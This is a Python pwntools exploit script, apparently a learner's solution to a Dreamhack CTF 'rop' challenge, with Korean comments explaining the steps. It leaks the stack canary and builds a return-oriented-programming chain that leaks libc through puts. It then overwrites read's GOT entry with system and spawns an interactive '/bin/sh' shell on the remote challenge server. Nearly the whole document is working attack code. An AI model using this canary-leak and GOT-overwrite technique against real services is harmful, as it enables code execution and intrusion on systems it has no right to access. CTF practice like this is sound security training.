from pwn import *

def slog(name,addr): return success(": ".join([name,hex(addr)]))

#p = process("./rop")
p = remote("host3.dreamhack.games",9506)
e = ELF("./rop")
libc = ELF("libc-2.27.so")

#Leak Canary
buf = b"A"*0x39
p.sendafter("Buf: ",buf)
p.recvuntil(buf)
cnry = u64(b'\x00'+ p.recvn(7))
slog("Canary", cnry)

read_system = libc.symbols["read"]-libc.symbols["system"]
read_got = e.got['read']
read_plt = e.plt['read']
puts_plt = e.plt['puts']
binsh = 0x7fffff748698
pop_rdi = 0x00000000004007f3
pop_rsi_r15 = 0x00000000004007f1

payload = b'A'*0x38+p64(cnry)+b'B'*0x8

#puts(read_got)
payload += p64(pop_rdi) + p64(read_got)
payload += p64(puts_plt)

#read(0, read_got, 0x10)
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(0)
payload += p64(read_plt) #이 이후에 53번 줄을 입력해줌으로써 read_got에 system()의 주소를 넣고 read_got+0x8에 /bin/sh값을 넣음

#read("/bin/sh") == system("/bin/sh")
payload += p64(pop_rdi) #rdi를 binsh로 설정해줌
payload += p64(read_got+0x8)
payload += p64(read_plt)
#read_plt가 가리키는 read_got에는 system()의 주소가 들어가있음 rdi는 이미 /bin/sh로 설정되있으므로 read_plt를 다시 실행해줌으로써 system("/bin/sh")를 실행함 
#read_got로 실행하는건 왜 안될까??
p.sendafter("Buf: ",payload)
read = u64(p.recvn(6)+b"\x00"*2)
lb = read - libc.symbols["read"]
system = lb + libc.symbols["system"]
slog("read",read)
slog("libc_base", lb)
slog("system", system)
slog("read_plt",read_plt)
slog("read_got",read_got)
slog("libc read address",libc.symbols["read"])

p.send(p64(system)+b"/bin/sh\x00")

p.interactive()